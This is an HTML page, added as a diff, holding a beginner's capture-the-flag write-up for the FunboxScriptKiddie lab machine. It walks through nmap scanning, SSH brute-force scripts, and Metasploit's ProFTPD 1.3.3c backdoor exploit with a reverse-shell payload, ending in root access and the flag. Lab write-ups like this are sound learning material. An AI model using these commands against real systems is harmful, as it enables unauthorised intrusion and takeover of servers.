@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VirtualBox Setup Guide</title>
+    <script src="Index.js" defer></script>
+</head>
+<body>
+    <nav class="navbar">
+        <ul class="nav-list">
+            <li><a href="index.html">Home</a></li>
+            <li class="dropdown">
+                <a href="virtualbox">VirtualBox</a>
+                <ul class="dropdown-content">
+                    <li><a href="Funbox.ScriptKiddie.html">FunboxScriptKiddie</a></li>
+                </ul>
+            </li>
+        </ul>
+    </nav>
+
+    <main class="content">
+        <h1>FunboxScriptKiddie CTF</h1>
+        <p class="paragraph-spacing">
+            Hi everyone! This is my first Virtual Box CTF, FunboxScriptKiddie. 
+            A co-worker recommended it to me, and I found it really fun to complete.
+        </p>
+        
+        <h2>Finding the Box</h2>
+        <p class="paragraph-spacing">Here’s what I needed for this challenge:</p>
+        <ul class="no-bullets">
+            <li>1. Oracle VMbox</li>
+            <li>2. Kali installed on Oracle VMbox</li>
+            <li>3. FunboxScriptKiddie Box on Oracle VMbox</li>
+        </ul>
+        
+        <p class="paragraph-spacing">
+            I started by downloading the two virtual boxes onto my laptop and VMware. 
+            I'm using Oracle VMware Box. I went into each VMbox setting and connected 
+            both boxes to the same NAT Network. If you're unsure how to do this, click here.
+        </p>
+        
+        <p class="paragraph-spacing">
+            Once everything was set up, I powered on both the Kali machine and the 
+            FunboxScriptKiddie machine.
+        </p>
+
+        <p class="paragraph-spacing">
+            After logging into Kali, I ran an <span class="italic bold">ifconfig</span> 
+            command to see what was connected to the network. Then, I used the 
+            <span class="italic bold">nmap -sV (type your network here)/24</span> 
+            command to scan all devices on the NAT network. This showed that the 
+            Funbox machine was located at 10.0.2.7.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="Nmap scan"></div>
+
+        <p class="paragraph-spacing">
+            The Nmap scan also revealed several open ports on this IP. Based on 
+            previous experience, I decided to target the open SSH port first. To 
+            look for vulnerabilities in this specific SSH version, I used the command 
+            <span class="italic bold">nmap -p 22 --script ssh* 10.0.2.7</span>.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="nmap brute force"></div>
+
+        <p class="paragraph-spacing">
+            The Nmap script used a brute force attack with a password manager. 
+            Since brute force attacks rely on password complexity, and this script 
+            only tested 3071 combinations, I didn’t gain much. However, I did gather 
+            some useful information about weak encryption algorithms.
+        </p>
+
+        <p class="paragraph-spacing">
+            I moved on to the open FTP port. To exploit the FTP I launched Metasploit with the 
+            <span class="italic bold">msfconsole</span> command. The Nmap scan showed 
+            that the Funbox server was using a FTP version called ProFTPD 1.3.3c. I searched for exploits 
+            using the command <span class="italic bold">search proftpd 1.3.3c</span>.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="msfconsole screenshot"></div>
+
+        <p class="paragraph-spacing">
+            The command found a backdoor exploit. I went ahead and used the exploit 
+            <span class="italic bold">use exploit/unix/ftp/proftpd_133c_backdoor</span>. 
+            Then, I set the target server with 
+            <span class="italic bold">set RHOST 10.0.2.7</span> and configured a reverse 
+            shell payload using <span class="italic bold">set payload /cmd/unix/reverse</span>. 
+            Finally, I set my local host with 
+            <span class="italic bold">set LHOST (your machine IP)</span> and executed the 
+            attack with <span class="italic bold">exploit</span>.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="msfconsole 2"></div>
+
+        <p class="paragraph-spacing">
+            Once inside, I used the <span class="italic bold">whoami</span> command to 
+            confirm access.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="whoami"></div>
+
+        <p class="paragraph-spacing">
+            Not only where we able to gain access but it seems as if we've gained root access, this could make this a whole lot easier.
+            With root access, I listed the directories on the server using 
+            the <span class="italic bold">ls</span> command. One directory that caught 
+            my attention was the root directory, as it often contains critical files.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="lscom"></div>
+
+        <p class="paragraph-spacing">
+            I navigated to the root directory using <span class="italic bold">cd root</span>. 
+            Once there, I ran <span class="italic bold">ls</span> again to see its contents. 
+            Inside, I found a file named <span class="italic bold">root.txt</span>.
+        </p>
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="cd root"></div>
+
+        <p>
+            To read the file, I used the command 
+            <span class="italic bold">cat root.txt</span>. And just like that, I had 
+            successfully found the flag for this CTF!
+        </p>
+
+
+        <script src="FunboxScriptKiddie.js" defer></script>
+        <div id="TheEnd"></div>
+
+    </main>
+</body>
+</html>
+
+
